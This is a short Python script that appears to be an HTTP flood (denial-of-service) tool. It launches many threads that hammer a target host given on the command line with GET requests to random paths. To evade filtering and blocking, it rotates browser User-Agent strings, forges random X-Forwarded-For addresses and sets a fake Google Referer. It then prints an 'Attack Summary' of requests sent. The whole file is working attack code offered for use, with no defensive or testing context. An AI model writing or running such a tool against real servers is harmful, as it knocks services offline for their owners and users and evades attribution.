import threading
import requests
import random
import string
import time
import sys

# ================= CONFIG DEFAULTS =================
TARGET_URL = "http://127.0.0.1"  # Default target
THREADS = 100
REQUESTS_PER_THREAD = 50
DELAY = 0.001

# ================= ARGUMENTS =================
if len(sys.argv) >= 2:
    TARGET_URL = f"http://{sys.argv[1]}"
if len(sys.argv) >= 3:
    THREADS = int(sys.argv[2])

print(f"Target: {TARGET_URL}")
print(f"Threads: {THREADS}")

# ================= HEADERS LIST =================
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

# Stats
success_count = 0
fail_count = 0
lock = threading.Lock()

def generate_random_path():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5,15)))

def attack(thread_id):
    global success_count, fail_count
    for i in range(REQUESTS_PER_THREAD):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
            "Referer": f"https://google.com/{generate_random_path()}",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive"
        }
        try:
            r = requests.get(f"{TARGET_URL}/{generate_random_path()}", headers=headers, timeout=3)
            with lock:
                success_count += 1
            print(f"[Thread {thread_id}] Request {i+1} => {r.status_code}")
        except requests.RequestException:
            with lock:
                fail_count += 1
            print(f"[Thread {thread_id}] Request {i+1} FAILED")
        time.sleep(DELAY)

def start_attack():
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=attack, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    start_time = time.time()
    start_attack()
    end_time = time.time()

    print("\n--- Attack Summary ---")
    print(f"Total Requests Sent: {success_count + fail_count}")
    print(f"Successful Requests: {success_count}")
    print(f"Failed Requests: {fail_count}")
    print(f"Success Rate: {success_count / (success_count + fail_count) * 100:.2f}%")
    print(f"Total Time: {end_time - start_time:.2f} sec")
    
